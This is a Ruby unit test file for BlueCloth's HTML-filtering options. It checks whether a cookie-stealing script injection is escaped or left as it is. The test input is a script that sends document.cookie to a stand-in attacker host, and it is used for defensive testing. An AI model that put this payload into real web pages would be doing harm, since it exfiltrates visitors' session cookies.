#!/usr/bin/ruby
#
# Unit test for contributed features 
# $Id: 15_Contrib.tests.rb,v 1.1 2005/01/07 23:01:51 alexeyv Exp $
#
# Copyright (c) 2004 The FaerieMUD Consortium.
# 

if !defined?( BlueCloth ) || !defined?( BlueCloth::TestCase )
	basedir = File::dirname( __FILE__ )
	require File::join( basedir, 'bctestcase' )
end



### This test case tests ...
class ContribTestCase < BlueCloth::TestCase

	DangerousHtml =
		"<script>document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie</script>"
	DangerousHtmlOutput =
		"<p>&lt;script&gt;document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie&lt;/script&gt;</p>"
	DangerousStylesOutput =
		"<script>document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie</script>"
	NoLessThanHtml = "Foo is definitely > than bar"
	NoLessThanOutput = "<p>Foo is definitely &gt; than bar</p>"


	### HTML filter options contributed by Florian Gross.

	### Test the :filter_html restriction
	def test_10_filter_html
		printTestHeader "filter_html Option"
		rval = bc = nil

		# Test as a 1st-level param
		assert_nothing_raised {
			bc = BlueCloth::new( DangerousHtml, :filter_html )
		}
		assert_instance_of BlueCloth, bc

		# Accessors
		assert_nothing_raised { rval = bc.filter_html }
		assert_equal true, rval
		assert_nothing_raised { rval = bc.filter_styles }
		assert_equal nil, rval

		# Test rendering with filters on
		assert_nothing_raised { rval = bc.to_html }
		assert_equal DangerousHtmlOutput, rval

		# Test setting it in a sub-array
		assert_nothing_raised {
			bc = BlueCloth::new( DangerousHtml, [:filter_html] )
		}
		assert_instance_of BlueCloth, bc
		
		# Accessors
		assert_nothing_raised { rval = bc.filter_html }
		assert_equal true, rval
		assert_nothing_raised { rval = bc.filter_styles }
		assert_equal nil, rval

		# Test rendering with filters on
		assert_nothing_raised { rval = bc.to_html }
		assert_equal DangerousHtmlOutput, rval
	end


	### Test the :filter_styles restriction
	def test_20_filter_styles
		printTestHeader "filter_styles Option"
		rval = bc = nil

		# Test as a 1st-level param
		assert_nothing_raised {
			bc = BlueCloth::new( DangerousHtml, :filter_styles )
		}
		assert_instance_of BlueCloth, bc
		
		# Accessors
		assert_nothing_raised { rval = bc.filter_styles }
		assert_equal true, rval
		assert_nothing_raised { rval = bc.filter_html }
		assert_equal nil, rval

		# Test rendering with filters on
		assert_nothing_raised { rval = bc.to_html }
		assert_equal DangerousStylesOutput, rval

		# Test setting it in a subarray
		assert_nothing_raised {
			bc = BlueCloth::new( DangerousHtml, [:filter_styles] )
		}
		assert_instance_of BlueCloth, bc

		# Accessors
		assert_nothing_raised { rval = bc.filter_styles }
		assert_equal true, rval
		assert_nothing_raised { rval = bc.filter_html }
		assert_equal nil, rval

		# Test rendering with filters on
		assert_nothing_raised { rval = bc.to_html }
		assert_equal DangerousStylesOutput, rval

	end


	### Test to be sure filtering when there's no opening angle brackets doesn't
	### die.
	def test_30_filter_no_less_than
		printTestHeader "filter without a less-than"
		rval = bc = nil

		# Test as a 1st-level param
		assert_nothing_raised {
			bc = BlueCloth::new( NoLessThanHtml, :filter_html )
		}
		assert_instance_of BlueCloth, bc

		assert_nothing_raised { rval = bc.to_html }
		assert_equal NoLessThanOutput, rval
	end
	


end

